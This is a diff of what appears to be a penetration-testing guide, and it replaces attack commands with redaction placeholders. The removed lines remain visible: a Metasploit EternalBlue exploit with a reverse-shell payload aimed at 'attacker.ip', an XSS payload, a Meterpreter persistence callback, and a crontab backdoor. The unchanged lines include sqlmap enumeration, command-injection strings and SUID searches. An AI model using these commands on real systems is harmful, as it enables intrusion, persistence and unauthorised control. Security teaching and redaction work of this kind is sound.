@@ -239,7 +239,7 @@ msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> set RHOSTS target.com
 
 # Set payload
-msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set PAYLOAD [REDACTED_METERPRETER_PAYLOAD]
 msf> set LHOST attacker.ip
 
 # Execute
@@ -263,7 +263,7 @@ sqlmap -u "http://target.com/page.php?id=1" --dbs
 sqlmap -u "http://target.com/page.php?id=1" -D database --tables
 
 # XSS testing
-# Manual: <script>alert('XSS')</script>
+# Manual: [REDACTED_XSS_PAYLOAD]
 
 # Command injection testing
 # ; ls -la
@@ -277,24 +277,24 @@ Establish persistent access:
 **Backdoors**
 ```bash
 # Meterpreter persistence
-meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip
+meterpreter> [REDACTED_PERSISTENCE_COMMAND]
 
 # SSH key persistence
 # Add attacker's public key to ~/.ssh/authorized_keys
 
 # Cron job persistence
-echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
+[REDACTED_CRON_PERSISTENCE]
 ```
 
 **Privilege Escalation**
 ```bash
 # Linux enumeration
 linpeas.sh
-linux-exploit-suggester.sh
+[REDACTED_LINUX_EXPLOIT_SUGGESTER]
 
 # Windows enumeration
 winpeas.exe
-windows-exploit-suggester.py
+[REDACTED_WINDOWS_EXPLOIT_SUGGESTER]
 
 # Check SUID binaries (Linux)
 find / -perm -4000 2>/dev/null
